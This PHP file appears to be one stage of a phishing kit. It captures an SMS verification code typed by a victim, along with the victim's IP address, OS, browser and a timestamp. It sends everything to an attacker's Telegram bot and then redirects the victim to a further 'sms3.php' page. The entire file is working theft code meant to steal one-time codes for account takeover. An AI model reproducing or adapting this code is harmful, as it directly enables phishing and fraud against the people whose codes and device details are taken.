<?php
include("../config/Sys.php");
include "../config/n8.php";
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeansms'] != "") )
{	
$hostname = gethostbyaddr($ip);
$message .= "+-------------------+\n";
$message .= "* SMS : ".$_POST['jeansms']."\n";
$message .= "* IP   : $ip\n";
$message .= "* OS   : $user_os\n";
$message .= "* TIME : $date\n";
$message .= "* SUM  : $user_browser\n";
$message .= "+-------------------+\n";
$token ='<TOKEN_REMOVED>';
$data = [
    'text' => $message,
    'chat_id' => $chat_id,
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

}


header("Location: ../sms3.php");

?>